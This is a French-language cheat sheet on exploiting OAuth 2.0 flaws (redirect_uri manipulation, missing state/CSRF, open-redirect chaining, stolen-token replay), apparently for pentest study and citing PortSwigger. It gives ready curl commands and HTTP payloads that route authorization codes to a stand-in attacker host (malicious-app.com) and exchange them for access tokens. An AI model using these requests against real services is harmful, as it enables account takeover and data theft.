# Oauth authentification

Voici une synthèse des principaux scénarios d’exploitation des failles d’**authentification OAuth 2.0**, présentée sous forme de liste numérotée et indentée, avec des exemples complets et condensés sur une seule ligne pour les payloads, commandes d’attaque et d’analyse, ainsi qu’une méthodologie détaillée et l’URL PortSwigger complète.

---

**1. Vol ou fuite de code d’autorisation ou de jeton d’accès via manipulation de redirect_uri**  
  1. Payload d’attaque neutre : GET /authorization?client_id=1234&redirect_uri=https://malicious-app.com/collect&response_type=code&scope=openid%20profile&state=xyz HTTP/1.1 Host: oauth-authorization-server.com  
  2. Commande d’attaque : curl "https://oauth-authorization-server.com/authorization?client_id=1234&redirect_uri=https://malicious-app.com/collect&response_type=code&scope=openid%20profile&state=xyz"  
  3. Commande d’analyse : Surveiller les requêtes reçues sur le serveur contrôlé par l’attaquant (ex : tcpdump ou netcat sur malicious-app.com) pour vérifier si le code d’autorisation ou le token y est transmis, puis utiliser ce code pour tenter d’obtenir un access_token via curl -X POST -d "client_id=1234&client_secret=secret&code=CODE_RECU&grant_type=authorization_code&redirect_uri=https://malicious-app.com/collect" https://oauth-authorization-server.com/token  
  4. Élément d’analyse détaillé : Vérifier si le serveur OAuth accepte des redirect_uri non strictement contrôlés, permettant à un attaquant de recevoir des codes ou tokens OAuth valides d’autres utilisateurs, et donc de prendre le contrôle de comptes ou d’accéder à des données sensibles[1][2][8][9].  
  5. Méthodologie détaillée : Manipuler le paramètre redirect_uri lors de la phase d’authentification, rediriger la réponse OAuth vers un domaine contrôlé, surveiller la réception du code ou du token, puis tenter d’échanger ce code contre un access_token ou d’accéder à l’application cible.  
  6. Source : https://portswigger.net/web-security/oauth

**2. Attaque CSRF par absence ou mauvaise gestion du paramètre state**  
  1. Payload d’attaque neutre : GET /authorization?client_id=1234&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile HTTP/1.1 Host: oauth-authorization-server.com  
  2. Commande d’attaque : curl "https://oauth-authorization-server.com/authorization?client_id=1234&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile"  
  3. Commande d’analyse : Observer si le paramètre state est absent ou prévisible dans les requêtes, puis tenter de rejouer ou d’intercepter une autorisation OAuth initiée par une victime pour s’authentifier à sa place, par exemple en utilisant Burp Suite pour capturer et rejouer la séquence d’authentification[2][5].  
  4. Élément d’analyse détaillé : Vérifier si l’application ne génère pas de valeur state unique et aléatoire pour chaque requête OAuth, ou ne la valide pas à la réception, ce qui permet à un attaquant de détourner le flux d’authentification ou d’effectuer une attaque CSRF.  
  5. Méthodologie détaillée : Lancer une authentification OAuth sans paramètre state ou avec un state fixe, puis tenter de réutiliser ou d’intercepter la réponse pour valider une session sur un autre compte, en observant si le serveur accepte la séquence sans contrôle.  
  6. Source : https://portswigger.net/web-security/oauth/csrf

**3. Exploitation d’une redirection ouverte dans l’application cliente lors du flux OAuth**  
  1. Payload d’attaque neutre : GET /authorization?client_id=1234&redirect_uri=https://client-app.com/redirect?next=https://malicious-app.com/collect&response_type=code&scope=openid%20profile&state=xyz HTTP/1.1 Host: oauth-authorization-server.com  
  2. Commande d’attaque : curl "https://oauth-authorization-server.com/authorization?client_id=1234&redirect_uri=https://client-app.com/redirect?next=https://malicious-app.com/collect&response_type=code&scope=openid%20profile&state=xyz"  
  3. Commande d’analyse : Surveiller sur le serveur de l’attaquant (malicious-app.com) si un code ou token OAuth est reçu en paramètre, puis utiliser ce code pour obtenir un access_token comme dans l’exemple 1, ou vérifier si la victime est effectivement redirigée vers le domaine malveillant après authentification[8][9].  
  4. Élément d’analyse détaillé : Vérifier si la présence d’une redirection ouverte dans l’application cliente permet à un attaquant d’intercepter le code ou le token OAuth, même si le redirect_uri principal est correctement contrôlé par le serveur OAuth.  
  5. Méthodologie détaillée : Exploiter une vulnérabilité de redirection ouverte sur le domaine client, injecter une URL malveillante dans le paramètre de redirection, puis observer si le flux OAuth permet la fuite du code ou du token vers l’attaquant.  
  6. Source : https://portswigger.net/web-security/oauth/openid

**4. Attaque par réutilisation de token ou de code OAuth volé**  
  1. Payload d’attaque neutre : Utiliser un code ou un access_token intercepté ou volé, par exemple code=HSJKQLPEMBCJEIAKPSNN ou access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...  
  2. Commande d’attaque : curl -X POST -d "client_id=1234&client_secret=secret&code=HSJKQLPEMBCJEIAKPSNN&grant_type=authorization_code&redirect_uri=https://client-app.com/callback" https://oauth-authorization-server.com/token  
  3. Commande d’analyse : Utiliser le token obtenu pour accéder à une API ou à une ressource protégée, par exemple curl -H "Authorization: Bearer ACCESS_TOKEN" https://client-app.com/api/userinfo et vérifier si l’accès est accordé avec les droits de la victime[1][2][9].  
  4. Élément d’analyse détaillé : Vérifier si un token ou code OAuth volé ou intercepté peut être réutilisé par un attaquant pour accéder à des ressources ou prendre le contrôle d’un compte utilisateur.  
  5. Méthodologie détaillée : Intercepter ou obtenir un code ou un token OAuth valide (via phishing, XSS, logs, etc.), tenter de l’échanger contre un access_token ou de l’utiliser directement pour accéder à l’application, puis vérifier si l’accès est accordé sans contrôle supplémentaire.  
  6. Source : https://portswigger.net/web-security/oauth/exploiting

---

